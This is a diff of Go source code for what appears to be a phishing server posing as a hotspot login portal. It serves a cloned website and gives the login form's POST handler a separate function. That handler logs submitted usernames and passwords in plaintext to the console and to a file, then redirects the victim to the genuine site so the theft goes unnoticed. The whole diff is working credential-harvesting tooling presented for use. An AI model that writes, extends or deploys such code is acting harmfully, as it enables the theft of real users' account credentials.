@@ -7,63 +7,37 @@ import (
 	"net/http"
 	"net/url"
 	"os"
-	"path"
 	"sync"
+
+	"../build"
 )
 
-const resFolder = "__res__"
-const indexRawHTML = "index.raw.html"
-const indexHTML = "index.html"
-const logFile = "log.txt"
-const successMsg = "Hotspot full. Try again later."
+const _successMsg = "Hotspot full. Try again later."
+const successMsg = `<script>window.location="%s"</script>`
 const msg404 = "404 Not Found."
 
 var fileIoMutex sync.Mutex
 
 //Serve serves the specified folder.
-func Serve(folder string, port uint) {
+func Serve(website build.Website, port uint) {
 
-	logfile := path.Join(folder, logFile)
+	_logfile := website.WebsiteName + ".log"
 
-	file, _ := os.OpenFile(logfile,
+	logFile, _ := os.OpenFile(_logfile,
 		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	defer file.Close()
+	defer logFile.Close()
 
 	http.HandleFunc("/",
 		func(w http.ResponseWriter, r *http.Request) {
-			serveFile(w, r, indexHTML)
+			serveFile(w, r, website.IndexFile)
 		})
 
 	http.HandleFunc("/login/",
 		func(w http.ResponseWriter, r *http.Request) {
-
-			if r.Method != "POST" {
-				fmt.Fprintln(w, msg404)
-				return
-			}
-
-			fmt.Fprintln(w, successMsg)
-
-			body, err := ioutil.ReadAll(r.Body)
-
-			if err != nil {
-				fmt.Fprintln(w, msg404)
-				log.Print(err)
-			}
-
-			values, err := url.ParseQuery(string(body))
-			email := values["email"][0]
-			pass := values["pass"][0]
-
-			log.Printf("Email: %s, Pass: %s", email, pass)
-
-			fileIoMutex.Lock()
-			fmt.Fprintf(file, "user: %s, pass: %s\n", email, pass)
-			fileIoMutex.Unlock()
-
+			handleLogin(website, logFile, w, r)
 		})
 
-	http.HandleFunc("/"+resFolder+"/",
+	http.HandleFunc(website.ResHandleMatch,
 		func(w http.ResponseWriter, r *http.Request) {
 			serveFile(w, r, r.URL.Path[1:])
 		})
@@ -72,6 +46,50 @@ func Serve(folder string, port uint) {
 
 	log.Printf("Serving on %s", addr)
 	log.Fatal(http.ListenAndServe(addr, nil))
+
+}
+
+func handleLogin(
+	web build.Website,
+	logFile *os.File,
+	w http.ResponseWriter,
+	r *http.Request) {
+
+	if r.Method != "POST" {
+		fmt.Fprintln(w, msg404)
+		return
+	}
+
+	fmt.Fprintf(w, successMsg, web.WebLink)
+
+	body, err := ioutil.ReadAll(r.Body)
+
+	if err != nil {
+		fmt.Fprintln(w, msg404)
+		log.Print(err)
+	}
+
+	values, err := url.ParseQuery(string(body))
+
+	if err != nil {
+		log.Printf(err.Error())
+		return
+	}
+
+	if len(values["user"]) != 1 || len(values["pass"]) != 1 {
+		log.Println("Wrong request.")
+		log.Println(values["user"])
+		log.Println(values["pass"])
+		return
+	}
+	user := values["user"][0]
+	pass := values["pass"][0]
+
+	log.Printf("User: %s, Pass: %s", user, pass)
+
+	fileIoMutex.Lock()
+	fmt.Fprintf(logFile, "user: %s, pass: %s\n", user, pass)
+	fileIoMutex.Unlock()
 
 }
 
